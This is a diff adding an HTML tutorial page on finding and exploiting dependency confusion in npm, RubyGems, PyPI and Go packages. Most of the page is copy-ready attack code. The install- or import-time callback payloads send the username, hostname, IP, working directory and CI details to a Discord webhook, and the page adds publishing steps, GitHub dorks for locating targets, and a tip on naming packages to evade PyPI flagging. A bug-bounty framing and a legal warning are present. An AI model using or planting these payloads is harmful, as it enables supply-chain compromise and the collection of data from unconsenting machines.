@@ -1,0 +1,1870 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tutorials - Dependency Confusion Hunter</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      color: #e0e0e0;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    header {
+      text-align: center;
+      padding: 30px 0;
+      border-bottom: 2px solid #ff4444;
+      margin-bottom: 30px;
+    }
+
+    h1 {
+      font-size: 32px;
+      color: #ff4444;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      color: #888;
+      font-size: 16px;
+    }
+
+    .nav-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 30px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .nav-tab {
+      padding: 12px 24px;
+      background: #2a2a3e;
+      border: none;
+      border-radius: 8px;
+      color: #e0e0e0;
+      cursor: pointer;
+      font-size: 14px;
+      transition: all 0.3s;
+    }
+
+    .nav-tab:hover {
+      background: #3a3a4e;
+    }
+
+    .nav-tab.active {
+      background: #ff4444;
+      color: white;
+    }
+
+    .tab-content {
+      display: none;
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    .tutorial-section {
+      background: #2a2a3e;
+      border-radius: 12px;
+      padding: 24px;
+      margin-bottom: 24px;
+    }
+
+    .tutorial-section h2 {
+      color: #ff4444;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .tutorial-section h3 {
+      color: #00d4aa;
+      margin: 20px 0 12px 0;
+      font-size: 18px;
+    }
+
+    .tutorial-section p {
+      line-height: 1.8;
+      margin-bottom: 16px;
+      color: #ccc;
+    }
+
+    .code-block {
+      background: #1a1a2e;
+      border-radius: 8px;
+      padding: 16px;
+      margin: 16px 0;
+      overflow-x: auto;
+      position: relative;
+    }
+
+    .code-block pre {
+      font-family: 'Fira Code', 'Consolas', monospace;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #e0e0e0;
+    }
+
+    .code-block .copy-btn {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      padding: 6px 12px;
+      background: #ff4444;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      cursor: pointer;
+      font-size: 12px;
+    }
+
+    .code-block .copy-btn:hover {
+      background: #ff6666;
+    }
+
+    .code-block .lang-badge {
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      padding: 4px 8px;
+      background: #3a3a4e;
+      border-radius: 4px;
+      font-size: 11px;
+      color: #888;
+    }
+
+    .warning-box {
+      background: rgba(255, 193, 7, 0.1);
+      border-left: 4px solid #ffc107;
+      padding: 16px;
+      border-radius: 8px;
+      margin: 16px 0;
+    }
+
+    .warning-box h4 {
+      color: #ffc107;
+      margin-bottom: 8px;
+    }
+
+    .info-box {
+      background: rgba(0, 123, 255, 0.1);
+      border-left: 4px solid #007bff;
+      padding: 16px;
+      border-radius: 8px;
+      margin: 16px 0;
+    }
+
+    .info-box h4 {
+      color: #007bff;
+      margin-bottom: 8px;
+    }
+
+    .success-box {
+      background: rgba(0, 212, 170, 0.1);
+      border-left: 4px solid #00d4aa;
+      padding: 16px;
+      border-radius: 8px;
+      margin: 16px 0;
+    }
+
+    .success-box h4 {
+      color: #00d4aa;
+      margin-bottom: 8px;
+    }
+
+    .step-list {
+      counter-reset: step;
+      list-style: none;
+      padding: 0;
+    }
+
+    .step-list li {
+      counter-increment: step;
+      padding: 16px 16px 16px 60px;
+      background: #1a1a2e;
+      border-radius: 8px;
+      margin-bottom: 12px;
+      position: relative;
+    }
+
+    .step-list li::before {
+      content: counter(step);
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 32px;
+      height: 32px;
+      background: #ff4444;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      color: white;
+    }
+
+    .dork-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+      gap: 12px;
+      margin: 16px 0;
+    }
+
+    .dork-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #1a1a2e;
+      padding: 12px;
+      border-radius: 8px;
+    }
+
+    .dork-item code {
+      flex: 1;
+      font-size: 12px;
+      color: #00d4aa;
+      word-break: break-all;
+    }
+
+    .dork-item button {
+      padding: 6px 10px;
+      background: #3a3a4e;
+      border: none;
+      border-radius: 4px;
+      color: #e0e0e0;
+      cursor: pointer;
+      font-size: 12px;
+    }
+
+    .dork-item button:hover {
+      background: #4a4a5e;
+    }
+
+    .ecosystem-card {
+      background: #1a1a2e;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 16px 0;
+    }
+
+    .ecosystem-card h4 {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 16px;
+      font-size: 18px;
+    }
+
+    .ecosystem-card table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    .ecosystem-card th,
+    .ecosystem-card td {
+      padding: 10px;
+      text-align: left;
+      border-bottom: 1px solid #3a3a4e;
+    }
+
+    .ecosystem-card th {
+      color: #888;
+      font-weight: normal;
+      font-size: 12px;
+      text-transform: uppercase;
+    }
+
+    .ecosystem-card code {
+      background: #2a2a3e;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 12px;
+    }
+
+    .bounty-highlight {
+      background: linear-gradient(135deg, #ff4444 0%, #ff6b6b 100%);
+      padding: 20px;
+      border-radius: 12px;
+      margin: 20px 0;
+      text-align: center;
+    }
+
+    .bounty-highlight h3 {
+      color: white;
+      font-size: 24px;
+      margin-bottom: 8px;
+    }
+
+    .bounty-highlight p {
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 14px;
+    }
+
+    .reference-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .reference-links a {
+      padding: 8px 16px;
+      background: #3a3a4e;
+      border-radius: 6px;
+      color: #00d4aa;
+      text-decoration: none;
+      font-size: 13px;
+      transition: all 0.3s;
+    }
+
+    .reference-links a:hover {
+      background: #4a4a5e;
+    }
+
+    .author-credit {
+      text-align: center;
+      padding: 30px 0;
+      margin-top: 30px;
+      border-top: 1px solid #3a3a4e;
+      color: #666;
+    }
+
+    .author-credit strong {
+      color: #ff4444;
+    }
+
+    @media (max-width: 768px) {
+      .dork-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>📚 Dependency Confusion Tutorials</h1>
+      <p class="subtitle">Complete Guide to Finding and Exploiting Dependency Confusion Vulnerabilities</p>
+    </header>
+
+    <nav class="nav-tabs">
+      <button class="nav-tab active" data-tab="overview">Overview</button>
+      <button class="nav-tab" data-tab="npm">NPM (Node.js)</button>
+      <button class="nav-tab" data-tab="ruby">Ruby (Gems)</button>
+      <button class="nav-tab" data-tab="python">Python (PyPI)</button>
+      <button class="nav-tab" data-tab="go">Go Modules</button>
+      <button class="nav-tab" data-tab="dorks">GitHub Dorks</button>
+      <button class="nav-tab" data-tab="tools">Tools</button>
+      <button class="nav-tab" data-tab="cases">Case Studies</button>
+      <button class="nav-tab" data-tab="bounties">Bug Bounties</button>
+    </nav>
+
+    <!-- Overview Tab -->
+    <div id="overviewTab" class="tab-content active">
+      <div class="tutorial-section">
+        <h2>🎯 What is Dependency Confusion?</h2>
+        <p>
+          Dependency Confusion is a supply chain attack that exploits how package managers resolve dependencies.
+          When a company uses internal/private packages with names that don't exist on public registries,
+          an attacker can register a package with the same name on the public registry with a higher version number.
+        </p>
+        <p>
+          The package manager, following its default behavior of fetching the highest version available,
+          will download the malicious public package instead of the legitimate internal one.
+        </p>
+
+        <div class="bounty-highlight">
+          <h3>$130,000+ in Bug Bounties</h3>
+          <p>Alex Birsan earned over $130,000 from Apple, Microsoft, Tesla, and 35+ companies using this technique.</p>
+        </div>
+
+        <h3>How It Works</h3>
+        <ol class="step-list">
+          <li><strong>Discovery:</strong> Find internal package names via exposed dependency files (package.json, Gemfile, requirements.txt)</li>
+          <li><strong>Verification:</strong> Check if the package name exists on public registries (npm, RubyGems, PyPI)</li>
+          <li><strong>Registration:</strong> If not found (404), register the package with a high version number (e.g., 99.99.99)</li>
+          <li><strong>Payload:</strong> Add post-install hooks that execute code and call back to your server</li>
+          <li><strong>Execution:</strong> When the target installs dependencies, your malicious package runs automatically</li>
+        </ol>
+
+        <div class="warning-box">
+          <h4>⚠️ Legal Warning</h4>
+          <p>Only test on systems you have explicit authorization to test. Dependency confusion attacks can affect production systems and CI/CD pipelines. Always coordinate with the target's security team through responsible disclosure.</p>
+        </div>
+      </div>
+
+      <div class="tutorial-section">
+        <h2>📦 Vulnerable Ecosystems</h2>
+
+        <div class="ecosystem-card">
+          <h4>Supported Package Managers</h4>
+          <table>
+            <tr>
+              <th>Ecosystem</th>
+              <th>Package File</th>
+              <th>Lock File</th>
+              <th>Registry</th>
+              <th>Post-Install Hook</th>
+            </tr>
+            <tr>
+              <td>NPM (Node.js)</td>
+              <td><code>package.json</code></td>
+              <td><code>package-lock.json</code></td>
+              <td>registry.npmjs.org</td>
+              <td><code>preinstall</code>, <code>postinstall</code></td>
+            </tr>
+            <tr>
+              <td>RubyGems</td>
+              <td><code>Gemfile</code></td>
+              <td><code>Gemfile.lock</code></td>
+              <td>rubygems.org</td>
+              <td><code>extensions</code></td>
+            </tr>
+            <tr>
+              <td>PyPI (Python)</td>
+              <td><code>requirements.txt</code></td>
+              <td><code>Pipfile.lock</code></td>
+              <td>pypi.org</td>
+              <td><code>setup.py</code></td>
+            </tr>
+            <tr>
+              <td>Go Modules</td>
+              <td><code>go.mod</code></td>
+              <td><code>go.sum</code></td>
+              <td>proxy.golang.org</td>
+              <td>N/A (compiled)</td>
+            </tr>
+            <tr>
+              <td>Cargo (Rust)</td>
+              <td><code>Cargo.toml</code></td>
+              <td><code>Cargo.lock</code></td>
+              <td>crates.io</td>
+              <td><code>build.rs</code></td>
+            </tr>
+            <tr>
+              <td>Composer (PHP)</td>
+              <td><code>composer.json</code></td>
+              <td><code>composer.lock</code></td>
+              <td>packagist.org</td>
+              <td><code>post-install-cmd</code></td>
+            </tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- NPM Tab -->
+    <div id="npmTab" class="tab-content">
+      <div class="tutorial-section">
+        <h2>📦 NPM Dependency Confusion</h2>
+        <p>
+          NPM is the most common target for dependency confusion attacks due to its widespread use
+          and the ease of publishing packages. The attack exploits npm's default behavior of
+          fetching the highest semver version from all configured registries.
+        </p>
+
+        <h3>Step 1: Find Target Packages</h3>
+        <p>Look for <code>package.json</code> files in:</p>
+        <ul style="margin-left: 20px; margin-bottom: 16px;">
+          <li>Public GitHub repositories</li>
+          <li>Exposed <code>/.well-known/</code> paths</li>
+          <li>JavaScript source maps</li>
+          <li>Webpack bundles with comments</li>
+        </ul>
+
+        <div class="code-block">
+          <span class="lang-badge">JSON</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>{
+  "name": "target-app",
+  "dependencies": {
+    "react": "^18.0.0",
+    "internal-auth-module": "^1.2.0",  // &lt;-- Target this!
+    "company-utils": "^3.0.0"          // &lt;-- Target this!
+  }
+}</pre>
+        </div>
+
+        <h3>Step 2: Check if Package Exists</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Check single package
+curl -s -o /dev/null -w "%{http_code}" https://registry.npmjs.org/internal-auth-module
+
+# 404 = Package doesn't exist = VULNERABLE
+# 200 = Package exists = Not vulnerable
+
+# Check multiple packages
+cat packages.txt | xargs -I{} sh -c 'echo "{}: $(curl -s -o /dev/null -w "%{http_code}" https://registry.npmjs.org/{})"'</pre>
+        </div>
+
+        <h3>Step 3: Create Malicious Package</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>mkdir internal-auth-module && cd internal-auth-module
+npm init -y</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">JSON - package.json</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>{
+  "name": "internal-auth-module",
+  "version": "99.99.99",
+  "description": "Security Research - Dependency Confusion PoC",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node callback.js"
+  },
+  "author": "Security Researcher",
+  "license": "MIT"
+}</pre>
+        </div>
+
+        <h3>Step 4: Create Callback Script</h3>
+        <div class="code-block">
+          <span class="lang-badge">JavaScript - callback.js</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>const https = require('https');
+const os = require('os');
+const dns = require('dns');
+
+const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL';
+const PACKAGE_NAME = 'internal-auth-module';
+
+// Get network info
+function getLocalIP() {
+  const interfaces = os.networkInterfaces();
+  for (const name of Object.keys(interfaces)) {
+    for (const iface of interfaces[name]) {
+      if (iface.family === 'IPv4' && !iface.internal) {
+        return iface.address;
+      }
+    }
+  }
+  return 'unknown';
+}
+
+// Detect CI/CD environment
+function detectCI() {
+  const ciVars = ['CI', 'GITHUB_ACTIONS', 'GITLAB_CI', 'JENKINS_URL', 'TRAVIS', 'CIRCLECI'];
+  for (const v of ciVars) {
+    if (process.env[v]) return v;
+  }
+  return 'Local Machine';
+}
+
+// Send callback to Discord
+async function sendCallback() {
+  const embed = {
+    embeds: [{
+      title: '🎯 Dependency Confusion - Callback Received!',
+      color: 0xff0000,
+      fields: [
+        { name: '📦 Package', value: PACKAGE_NAME, inline: true },
+        { name: '👤 User', value: os.userInfo().username, inline: true },
+        { name: '🖥️ Hostname', value: os.hostname(), inline: true },
+        { name: '🌐 Local IP', value: getLocalIP(), inline: true },
+        { name: '💻 Platform', value: `${os.platform()} ${os.arch()}`, inline: true },
+        { name: '🏭 CI Environment', value: detectCI(), inline: true },
+        { name: '📁 Directory', value: process.cwd(), inline: false }
+      ],
+      footer: { text: 'Dependency Confusion Hunter by OFJAAAH' },
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  const url = new URL(DISCORD_WEBHOOK);
+  const req = https.request({
+    hostname: url.hostname,
+    path: url.pathname,
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' }
+  });
+
+  req.write(JSON.stringify(embed));
+  req.end();
+}
+
+sendCallback();</pre>
+        </div>
+
+        <h3>Step 5: Publish Package</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Login to npm
+npm login
+
+# Publish the package
+npm publish --access public
+
+# Verify publication
+npm view internal-auth-module</pre>
+        </div>
+
+        <div class="success-box">
+          <h4>✅ Expected Result</h4>
+          <p>When the target runs <code>npm install</code>, your package will be installed and the callback script will execute, sending system information to your Discord webhook.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Ruby Tab -->
+    <div id="rubyTab" class="tab-content">
+      <div class="tutorial-section">
+        <h2>💎 Ruby Gems Dependency Confusion</h2>
+        <p>
+          Ruby applications using Bundler are vulnerable to dependency confusion when internal gems
+          are not properly scoped. Shopify paid a $30,000 bounty for this vulnerability affecting
+          their "shopify-cloud" gem.
+        </p>
+
+        <div class="bounty-highlight">
+          <h3>$30,000 - Shopify Bug Bounty</h3>
+          <p>Shopify's build system automatically installed a malicious gem within hours of publication.</p>
+        </div>
+
+        <h3>Step 1: Find Target Gems</h3>
+        <p>Look for <code>Gemfile</code> or <code>Gemfile.lock</code> files:</p>
+
+        <div class="code-block">
+          <span class="lang-badge">Ruby - Gemfile</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>source 'https://rubygems.org'
+
+gem 'rails', '~> 7.0'
+gem 'internal-auth-gem'      # &lt;-- Target this!
+gem 'company-core-utils'     # &lt;-- Target this!
+gem 'shopify-cloud'          # &lt;-- Famous $30k bounty!</pre>
+        </div>
+
+        <h3>Step 2: Check RubyGems Availability</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Check single gem
+curl -s -o /dev/null -w "%{http_code}" https://rubygems.org/api/v1/gems/internal-auth-gem.json
+
+# 404 = Gem doesn't exist = VULNERABLE
+# 200 = Gem exists = Not vulnerable
+
+# Bulk check with httpx
+cat gems.txt | xargs -n1 -I{} httpx -silent -status-code -mc 404 "https://rubygems.org/gems/{}"</pre>
+        </div>
+
+        <h3>Step 3: Extract Gems from Repositories</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Clone organization repos
+ghorg clone target-org -t YOUR_GITHUB_TOKEN
+
+# Extract gem names from Gemfiles
+find . -type f -name Gemfile | \
+  xargs -n1 -I{} awk '/^\s*gem / {gsub(/[",'\''()\]/, "", $2); print $2}' {} | \
+  sort -u > gems.txt
+
+# Filter only internal-looking gems
+grep -E '^(internal|company|corp|private|org)' gems.txt</pre>
+        </div>
+
+        <h3>Step 4: Create Malicious Gem</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>mkdir internal-auth-gem && cd internal-auth-gem
+mkdir lib</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Ruby - internal-auth-gem.gemspec</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>Gem::Specification.new do |s|
+  s.name        = "internal-auth-gem"
+  s.version     = "99.99.99"
+  s.summary     = "Security Research - Dependency Confusion PoC"
+  s.description = "This package is part of a security research project."
+  s.authors     = ["Security Researcher"]
+  s.email       = "researcher@example.com"
+  s.files       = ["lib/internal-auth-gem.rb"]
+  s.homepage    = "https://rubygems.org/gems/internal-auth-gem"
+  s.license     = "MIT"
+end</pre>
+        </div>
+
+        <h3>Step 5: Create Callback Payload</h3>
+        <div class="code-block">
+          <span class="lang-badge">Ruby - lib/internal-auth-gem.rb</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>require 'json'
+require 'net/http'
+require 'socket'
+
+DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL'
+PACKAGE_NAME = 'internal-auth-gem'
+
+# Get local IP
+def get_local_ip
+  Socket.ip_address_list.detect(&:ipv4_private?)&.ip_address || 'unknown'
+end
+
+# Detect CI environment
+def detect_ci
+  ci_vars = %w[CI GITHUB_ACTIONS GITLAB_CI JENKINS_URL TRAVIS CIRCLECI]
+  ci_vars.each { |v| return v if ENV[v] }
+  'Local Machine'
+end
+
+# Send callback to Discord
+def send_callback
+  embed = {
+    embeds: [{
+      title: '🎯 Dependency Confusion - Ruby Gem Callback!',
+      color: 0xff0000,
+      fields: [
+        { name: '📦 Package', value: PACKAGE_NAME, inline: true },
+        { name: '👤 User', value: ENV['USER'] || 'unknown', inline: true },
+        { name: '🖥️ Hostname', value: Socket.gethostname, inline: true },
+        { name: '🌐 Local IP', value: get_local_ip, inline: true },
+        { name: '💻 Platform', value: "#{RUBY_PLATFORM}", inline: true },
+        { name: '🏭 CI Environment', value: detect_ci, inline: true },
+        { name: '📁 Directory', value: Dir.pwd, inline: false },
+        { name: '💎 Ruby Version', value: RUBY_VERSION, inline: true }
+      ],
+      footer: { text: 'Dependency Confusion Hunter by OFJAAAH' },
+      timestamp: Time.now.utc.iso8601
+    }]
+  }
+
+  uri = URI(DISCORD_WEBHOOK)
+  http = Net::HTTP.new(uri.host, uri.port)
+  http.use_ssl = true
+
+  request = Net::HTTP::Post.new(uri.path)
+  request['Content-Type'] = 'application/json'
+  request.body = embed.to_json
+
+  http.request(request)
+rescue => e
+  # Silently fail
+end
+
+# Execute on require
+send_callback</pre>
+        </div>
+
+        <h3>Step 6: Build and Publish</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Build the gem
+gem build internal-auth-gem.gemspec
+
+# Push to RubyGems
+gem push internal-auth-gem-99.99.99.gem
+
+# Verify publication
+gem search internal-auth-gem</pre>
+        </div>
+
+        <div class="info-box">
+          <h4>ℹ️ Ruby-Specific Notes</h4>
+          <p><strong>Bundler Source Blocks:</strong> Modern Bundler versions (2.2.10+) support explicit source blocks that prevent this attack. Look for unprotected gems outside source blocks.</p>
+          <p><strong>Gemfile.lock Format:</strong> The new lockfile format assigns each gem to an explicit source, eliminating ambiguity.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Python Tab -->
+    <div id="pythonTab" class="tab-content">
+      <div class="tutorial-section">
+        <h2>🐍 Python PyPI Dependency Confusion</h2>
+        <p>
+          Python's pip package manager is vulnerable when using <code>--extra-index-url</code>
+          to mix public and private registries. The resolver may choose the higher version
+          from PyPI over the internal package.
+        </p>
+
+        <h3>Step 1: Find Target Packages</h3>
+        <p>Look for <code>requirements.txt</code>, <code>setup.py</code>, or <code>Pipfile</code>:</p>
+
+        <div class="code-block">
+          <span class="lang-badge">Text - requirements.txt</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>django>=4.0
+requests>=2.28
+internal-company-sdk>=1.0.0    # &lt;-- Target this!
+corp-auth-utils>=2.5.0         # &lt;-- Target this!</pre>
+        </div>
+
+        <h3>Step 2: Check PyPI Availability</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Check single package
+curl -s -o /dev/null -w "%{http_code}" https://pypi.org/pypi/internal-company-sdk/json
+
+# 404 = Package doesn't exist = VULNERABLE
+
+# Bulk check
+cat packages.txt | while read pkg; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/pypi/$pkg/json")
+  [ "$code" = "404" ] && echo "$pkg: VULNERABLE"
+done</pre>
+        </div>
+
+        <h3>Step 3: Create Malicious Package</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>mkdir internal-company-sdk && cd internal-company-sdk
+mkdir internal_company_sdk  # Note: underscores for Python module</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Python - setup.py</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>from setuptools import setup
+import os
+import socket
+import json
+import urllib.request
+
+# Callback executed during installation
+def send_callback():
+    webhook = 'YOUR_DISCORD_WEBHOOK_URL'
+
+    embed = {
+        'embeds': [{
+            'title': '🎯 Dependency Confusion - Python Package Callback!',
+            'color': 0xff0000,
+            'fields': [
+                {'name': '📦 Package', 'value': 'internal-company-sdk', 'inline': True},
+                {'name': '👤 User', 'value': os.environ.get('USER', 'unknown'), 'inline': True},
+                {'name': '🖥️ Hostname', 'value': socket.gethostname(), 'inline': True},
+                {'name': '📁 Directory', 'value': os.getcwd(), 'inline': False},
+                {'name': '🐍 Python', 'value': os.popen('python --version').read().strip(), 'inline': True}
+            ]
+        }]
+    }
+
+    try:
+        req = urllib.request.Request(
+            webhook,
+            data=json.dumps(embed).encode('utf-8'),
+            headers={'Content-Type': 'application/json'}
+        )
+        urllib.request.urlopen(req)
+    except:
+        pass
+
+send_callback()
+
+setup(
+    name='internal-company-sdk',
+    version='99.99.99',
+    description='Security Research - Dependency Confusion PoC',
+    author='Security Researcher',
+    packages=['internal_company_sdk'],
+    python_requires='>=3.6'
+)</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Python - internal_company_sdk/__init__.py</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Empty file or additional callback
+pass</pre>
+        </div>
+
+        <h3>Step 4: Build and Publish</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Install build tools
+pip install twine build
+
+# Build the package
+python -m build
+
+# Upload to PyPI
+twine upload dist/*</pre>
+        </div>
+
+        <div class="warning-box">
+          <h4>⚠️ PyPI Specific</h4>
+          <p>PyPI has stricter name policies. Package names with "internal", "private", or company names may be flagged. Use creative naming that looks legitimate.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Go Tab -->
+    <div id="goTab" class="tab-content">
+      <div class="tutorial-section">
+        <h2>🔷 Go Modules Dependency Confusion</h2>
+        <p>
+          Go modules use a different resolution mechanism based on module paths (import URLs).
+          While harder to exploit than npm/PyPI, private modules with public-looking paths can be vulnerable.
+        </p>
+
+        <h3>Understanding Go Module Resolution</h3>
+        <div class="info-box">
+          <h4>ℹ️ How Go Resolves Modules</h4>
+          <p>Go modules are identified by their import path (e.g., <code>github.com/company/internal-tool</code>).
+          The Go proxy (proxy.golang.org) caches public modules. Private modules require GOPRIVATE configuration.</p>
+        </div>
+
+        <h3>Step 1: Find Target Modules</h3>
+        <div class="code-block">
+          <span class="lang-badge">Go - go.mod</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>module github.com/company/main-app
+
+go 1.21
+
+require (
+    github.com/gin-gonic/gin v1.9.0
+    company.internal/auth-service v1.2.0     // &lt;-- Private module
+    github.com/company/internal-utils v0.1.0 // &lt;-- Could be vulnerable!
+)</pre>
+        </div>
+
+        <h3>Step 2: Check Module Availability</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Check if module exists on Go proxy
+curl -s "https://proxy.golang.org/github.com/company/internal-utils/@v/list"
+
+# Empty response = Module not cached/available = Potential target
+
+# Check pkg.go.dev
+curl -s -o /dev/null -w "%{http_code}" "https://pkg.go.dev/github.com/company/internal-utils"</pre>
+        </div>
+
+        <h3>Step 3: Create Malicious Module</h3>
+        <p>To exploit Go dependency confusion, you need to control the domain or create a GitHub repository with matching path:</p>
+
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Create GitHub repo matching the import path
+# github.com/YOUR_USERNAME/internal-utils
+# Then transfer to target org name (if possible) or use typosquatting</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Go - go.mod</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>module github.com/company/internal-utils
+
+go 1.21</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Go - main.go</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>package internalutils
+
+import (
+    "bytes"
+    "encoding/json"
+    "net/http"
+    "os"
+    "os/user"
+    "runtime"
+)
+
+func init() {
+    go sendCallback()
+}
+
+func sendCallback() {
+    webhook := "YOUR_DISCORD_WEBHOOK_URL"
+
+    currentUser, _ := user.Current()
+    hostname, _ := os.Hostname()
+    cwd, _ := os.Getwd()
+
+    embed := map[string]interface{}{
+        "embeds": []map[string]interface{}{{
+            "title": "🎯 Dependency Confusion - Go Module Callback!",
+            "color": 0xff0000,
+            "fields": []map[string]interface{}{
+                {"name": "📦 Module", "value": "github.com/company/internal-utils", "inline": true},
+                {"name": "👤 User", "value": currentUser.Username, "inline": true},
+                {"name": "🖥️ Hostname", "value": hostname, "inline": true},
+                {"name": "💻 Platform", "value": runtime.GOOS + "/" + runtime.GOARCH, "inline": true},
+                {"name": "📁 Directory", "value": cwd, "inline": false},
+                {"name": "🔷 Go Version", "value": runtime.Version(), "inline": true},
+            },
+        }},
+    }
+
+    data, _ := json.Marshal(embed)
+    http.Post(webhook, "application/json", bytes.NewBuffer(data))
+}</pre>
+        </div>
+
+        <h3>Step 4: Tag and Publish</h3>
+        <div class="code-block">
+          <span class="lang-badge">Bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Tag with high version
+git tag v99.99.99
+git push origin v99.99.99
+
+# Module will be available after first fetch request to proxy.golang.org</pre>
+        </div>
+
+        <div class="warning-box">
+          <h4>⚠️ Go-Specific Challenges</h4>
+          <p><strong>GOPRIVATE:</strong> If targets use GOPRIVATE env var, the proxy is bypassed for matching paths.</p>
+          <p><strong>Module Paths:</strong> You need to control the exact import path, which usually requires domain control or GitHub org access.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- GitHub Dorks Tab -->
+    <div id="dorksTab" class="tab-content">
+      <div class="tutorial-section">
+        <h2>🔍 GitHub Dorking Queries</h2>
+        <p>
+          Use these GitHub search queries to find exposed dependency files and potential targets.
+          Replace <code>TARGET</code> with the organization or company name.
+        </p>
+
+        <h3>📦 NPM / Node.js</h3>
+        <div class="dork-grid">
+          <div class="dork-item">
+            <code>org:TARGET filename:package.json</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:package-lock.json</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>"TARGET" filename:package.json "dependencies"</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET "private": true filename:package.json</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:yarn.lock</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>"@TARGET/" filename:package.json</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+        </div>
+
